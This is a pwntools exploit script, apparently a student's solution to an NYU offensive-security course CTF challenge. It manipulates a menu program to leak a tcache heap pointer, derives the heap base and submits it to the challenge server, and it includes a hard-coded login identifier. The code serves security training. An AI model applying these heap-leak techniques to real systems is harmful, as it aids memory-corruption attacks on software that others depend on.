from pwn import *

p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1211)
p.recvuntil("abc123): ".encode()) 
p.sendline("vc2499".encode()) 
p.recvuntil(".") 

def extract_tcache_address():
    p.sendlineafter(b"> ", b"2") 
    p.sendlineafter(b"> ", str(2).encode())  
    response = p.recvline().strip().split(b": ")[1]  
    address = int(response, 16)  
    print(f"Leaked address: {hex(address)}")
    return address

p.sendlineafter(b"> ", b"1")  
p.sendlineafter(b"> ", b"scarf") 
p.sendlineafter(b"> ", str(8).encode()) 
p.sendlineafter(b"> ", b"chain") 
p.sendline() 
p.sendlineafter(b"> ", b"3")  
p.sendline()  
tcache_address = extract_tcache_address()

heap_base = tcache_address & ~0xfff  
log.success(f"Heap base address: {hex(heap_base)}") 

p.sendlineafter(b'> ', b'\n') 
p.sendlineafter(b'> ', b'\n')
p.sendlineafter(b'> ', b'\n')
p.sendafter(b"?", str(heap_base).encode())  
p.interactive()

